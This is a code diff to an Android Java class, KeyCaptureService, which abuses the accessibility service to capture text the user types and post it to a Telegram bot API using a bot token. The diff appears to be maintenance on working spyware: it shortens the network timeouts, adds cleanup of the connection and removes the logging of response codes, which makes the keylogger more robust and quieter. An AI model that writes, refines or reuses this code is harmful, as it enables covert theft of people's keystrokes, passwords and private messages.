@@ -19,7 +19,7 @@ public class KeyCaptureService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try {
             if (event == null) return;
-            
+
             int eventType = event.getEventType();
             if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                 List<CharSequence> textList = event.getText();
@@ -34,7 +34,7 @@ public class KeyCaptureService extends AccessibilityService {
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error in onAccessibilityEvent", e);
+            Log.e(TAG, "Error processing event", e);
         }
     }
 
@@ -47,15 +47,16 @@ public class KeyCaptureService extends AccessibilityService {
         new Thread(new Runnable() {
             @Override
             public void run() {
+                HttpURLConnection conn = null;
                 try {
                     String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                     URL url = new URL(urlString);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
                     conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                     conn.setRequestProperty("Accept", "application/json");
-                    conn.setConnectTimeout(5000);
-                    conn.setReadTimeout(5000);
+                    conn.setConnectTimeout(4000);
+                    conn.setReadTimeout(4000);
                     conn.setDoOutput(true);
 
                     String sanitizedMessage = message.replace("\"", "\\\"");
@@ -66,10 +67,13 @@ public class KeyCaptureService extends AccessibilityService {
                         os.write(input, 0, input.length);
                     }
 
-                    int responseCode = conn.getResponseCode();
-                    Log.d(TAG, "Telegram response code: " + responseCode);
+                    conn.getResponseCode(); // Trigger request execution
                 } catch (Exception e) {
-                    Log.e(TAG, "Failed to send to Telegram", e);
+                    Log.e(TAG, "Telegram send error", e);
+                } finally {
+                    if (conn != null) {
+                        conn.disconnect();
+                    }
                 }
             }
         }).start();
